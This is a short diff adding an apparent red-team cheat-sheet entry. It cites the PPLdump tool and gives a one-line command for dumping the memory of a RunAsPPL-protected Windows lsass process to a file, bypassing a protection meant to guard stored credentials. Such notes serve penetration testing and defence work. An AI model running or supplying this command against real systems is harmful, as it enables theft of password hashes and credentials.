@@ -1,0 +1,9 @@
+### Source
+https://github.com/itm4n/PPLdump  
+
+### Dump RunAsPPL protected lsass process
+```
+PPLdump.exe lsass.exe &lt;file&gt;.dmp
+```
+
+
